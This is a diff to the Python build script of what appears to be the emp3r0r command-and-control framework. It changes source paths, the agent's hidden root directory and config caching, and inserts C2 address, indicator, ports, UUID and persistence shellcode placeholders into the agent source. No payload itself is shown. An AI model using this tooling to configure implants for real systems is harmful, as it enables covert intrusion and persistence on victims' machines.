@@ -51,23 +51,29 @@ class GoBuild:
         if "agent_root" in CACHED_CONF:
             self.AgentRoot = CACHED_CONF['agent_root']
         else:
-            self.AgentRoot = f"/dev/shm/.{rand_str(random.randint(3, 9))}"
+            self.AgentRoot = f".{rand_str(random.randint(3, 9))}"
             CACHED_CONF['agent_root'] = self.AgentRoot
 
     def build(self):
         '''
         cd to cmd and run go build
         '''
-        # write cache
-        json_file = open(BUILD_JSON, "w+")
-        json.dump(CACHED_CONF, json_file)
-        json_file.close()
-
         self.gen_certs()
         # CA
         f = open("./tls/rootCA.crt")
         self.CA = f.read()
         f.close()
+
+        # cache CA, too
+        CACHED_CONF['ca'] = self.CA
+
+        # cache version
+        CACHED_CONF['version'] = self.VERSION
+
+        # write cache
+        json_file = open(BUILD_JSON, "w+")
+        json.dump(CACHED_CONF, json_file)
+        json_file.close()
 
         self.set_tags()
 
@@ -130,30 +136,30 @@ class GoBuild:
         '''
 
         # version
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             f"Version = \"{self.VERSION}\"", "Version = \"[emp3r0r_version_string]\"")
         # agent root path
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             self.AgentRoot, "[agent_root]")
         # CA
-        sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
+        sed("./lib/tun/tls.go", self.CA, "[emp3r0r_ca]")
         if self.target == "agent":
             # guardian_shellcode
-            sed("./internal/agent/def.go", f"GuardianShellcode = `{CACHED_CONF['guardian_shellcode']}`",
+            sed("./lib/agent/def.go", f"GuardianShellcode = `{CACHED_CONF['guardian_shellcode']}`",
                 "GuardianShellcode = `[persistence_shellcode]`")
-            sed("./internal/agent/def.go", f"GuardianAgentPath = \"{CACHED_CONF['guardian_agent_path']}\"",
+            sed("./lib/agent/def.go", f"GuardianAgentPath = \"{CACHED_CONF['guardian_agent_path']}\"",
                 "GuardianAgentPath = \"[persistence_agent_path]\"")
         # cc indicator
-        sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
+        sed("./lib/agent/def.go", self.INDICATOR, "[cc_indicator]")
         # in case we use the same IP for indicator and CC
-        sed("./internal/agent/def.go", self.CCIP, "[cc_ipaddr]")
-        sed("./internal/agent/def.go", self.UUID, "[agent_uuid]")
+        sed("./lib/agent/def.go", self.CCIP, "[cc_ipaddr]")
+        sed("./lib/agent/def.go", self.UUID, "[agent_uuid]")
         # restore ports
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             f"CCPort = \"{CACHED_CONF['cc_port']}\"", "CCPort = \"[cc_port]\"")
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"", "ProxyPort = \"[proxy_port]\"")
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"", "BroadcastPort = \"[broadcast_port]\"")
 
     def set_tags(self):
@@ -162,30 +168,30 @@ class GoBuild:
         '''
 
         # version
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")
         if self.target == "agent":
             # guardian shellcode
-            sed("./internal/agent/def.go",
+            sed("./lib/agent/def.go",
                 "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
-            sed("./internal/agent/def.go",
+            sed("./lib/agent/def.go",
                 "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
         # CA
-        sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
+        sed("./lib/tun/tls.go", "[emp3r0r_ca]", self.CA)
         # CC IP
-        sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
+        sed("./lib/agent/def.go", "[cc_ipaddr]", self.CCIP)
         # agent root path
-        sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
+        sed("./lib/agent/def.go", "[agent_root]", self.AgentRoot)
         # indicator
-        sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
+        sed("./lib/agent/def.go", "[cc_indicator]", self.INDICATOR)
         # agent UUID
-        sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
+        sed("./lib/agent/def.go", "[agent_uuid]", self.UUID)
         # ports
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             "[cc_port]", CACHED_CONF['cc_port'])
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             "[proxy_port]", CACHED_CONF['proxy_port'])
-        sed("./internal/agent/def.go",
+        sed("./lib/agent/def.go",
             "[broadcast_port]", CACHED_CONF['broadcast_port'])
 
 
